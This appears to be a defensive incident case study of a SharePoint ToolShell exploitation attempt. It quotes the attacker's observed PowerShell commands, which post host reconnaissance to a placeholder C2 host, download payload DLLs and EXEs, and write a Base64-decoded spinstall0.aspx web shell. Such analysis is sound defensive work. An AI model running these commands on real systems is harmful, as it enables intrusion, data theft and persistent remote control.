# Case Study 001 - SharePoint ToolShell Exploitation Attempt (CVE-2025-49706, CVE-2025-53770, CVE-2025-49704)

> - **Severity:** High
> - **Date:** July 2025
> - **Framework:** MITRE ATT&CK - T1190 Exploit Public-Facing Application


## Overview
The SharePoint ToolShell vulnerabilities include a chain of critical flaws disclosed in 2025.
- **[CVE-2025-49706](https://nvd.nist.gov/vuln/detail/CVE-2025-49706 "https://nvd.nist.gov/vuln/detail/CVE-2025-49706")** allows attackers to bypass authentication mechanisms.
- **[CVE-2025-49704](https://nvd.nist.gov/vuln/detail/CVE-2025-49704 "https://nvd.nist.gov/vuln/detail/CVE-2025-49704")** enables arbitrary file writes, which can be leveraged to achieve remote code execution without valid credentials.
- Two additional variants, **CVE-2025-53771** (derived from CVE-2025-49706) and [CVE-2025-53770](https://nvd.nist.gov/vuln/detail/CVE-2025-53770 "https://nvd.nist.gov/vuln/detail/CVE-2025-53770") (derived from CVE-2025-49704), were later identified through fuzzing research.

Together, these vulnerabilities present a high-risk attack surface where unauthenticated adversaries can gain full control of vulnerable SharePoint instances.

## Detection & Analysis
- Initial alert triggered in **Stellar Cyber XDR** (High Severity).
- **Correlated telemetry:** Microsoft Defender for Endpoint indicated `w3wp.exe` (IIS worker) spawning PowerShell and `cmd.exe` processes consistent with post-exploit activity.

#### Observed behaviors:
- **Recon & data exfil** via `Invoke-WebRequest` **HTTP POST** to external hosts:
    
    - `$(whoami /all)`, `$(systeminfo)`, `$(tasklist /v)`, `$(netstat -ano)`, directory listings of SharePoint and user profile paths.
        
- **Web app & SharePoint enumeration**:
    
    - `appcmd list app /text:[path='/'].physicalPath`, listings under `C:\inetpub\wwwroot\wss\VirtualDirectories\...` and `...\App_GlobalResources`.
        
- **Artifact download & drop** (cleartext HTTP):
    
    - EXE/DLLs fetched from external IPs/domains and saved under `C:\Users\[SERVICE_ACCOUNT]\AppData\Local\...` and `C:\ProgramData\...`.
        
- **Potential web shell deployment**:
    
    - **Decoded `-EncodedCommand` summary:** writes a **Base64-encoded ASPX file** to SharePoint **LAYOUTS** path as `spinstall0.aspx`:
```
$destinationFile = "C:\PROGRA~1\COMMON~1\MICROS~1\WEBSER~1\16\TEMPLATE\LAYOUTS\spinstall0.aspx"
$decodedContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64String))
$decodedContent | Set-Content -Path $destinationFile
```
→ This is consistent with **ToolShell-style web shell write** into a globally served SharePoint directory.
- **Other signs**: creation of `0.css` in `App_GlobalResources` (write test / file-drop), and plaintext download of binaries (`SPDesk.exe`, `SPlog.exe`, `log.dll`, `Product.Wsc.dll`, `nvsmartmax64.dll`, `txmlutil.dll`).

#### Representative command patterns:
 ``` 
# Exfil / recon
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(whoami /all)
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(systeminfo)
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(netstat -ano)
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(dir C:\inetpub\wwwroot\wss\VirtualDirectories)

# Artifact downloads
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/asx -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\WebTempDir\SPlog.exe
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/2   -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\log.dll
powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/3   -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\Product.Wsc.dll

# SharePoint/IIS context
w3wp.exe -ap "SharePointWebAppPools" ...
cmd.exe /c C:\Windows\System32\inetsrv\appcmd.exe list app /text:[path='/'].physicalPath

# EncodedCommand (web shell write to LAYOUTS)
cmd.exe /c powershell -EncodedCommand <BASE64>   # decodes and writes spinstall0.aspx to LAYOUTS

 ```

#### Encoded Command:
<img width="587" height="783" alt="image" src="https://github.com/user-attachments/assets/c75fa5d5-98ad-452d-b7f5-bdb4748ae64d" />



## Analysis Summary
- The activity observed is consistent with post-exploitation of a SharePoint vulnerability. Adversaries leveraged `w3wp.exe` to spawn PowerShell and `cmd.exe` for:

- **Reconnaissance & Exfiltration** – collecting host details (`systeminfo`, `whoami`, `tasklist`, `netstat`) and directory listings, then exfiltrating results via cleartext HTTP POST to external C2 servers.
    
- **File Write & Payload Delivery** – downloading executables and DLLs into service account directories (`AppData\Local`, `ProgramData`), indicating attempts at persistence or staging.
    
- **Web Shell Deployment** – a Base64-encoded PowerShell payload decoded and wrote an ASPX file (`spinstall0.aspx`) into the SharePoint `LAYOUTS` directory, providing an accessible web shell for remote control.
    
- **SharePoint/IIS Enumeration** – commands targeting `appcmd.exe` and SharePoint resource directories, suggesting knowledge of SharePoint application structure.
    

These behaviors demonstrate a multi-stage attack chain: 
> **Initial Compromise** → **Host Reconnaissance** → **Data Exfiltration** → **Payload Deployment** → **Web Shell Installation for Persistence and Further Exploitation**.

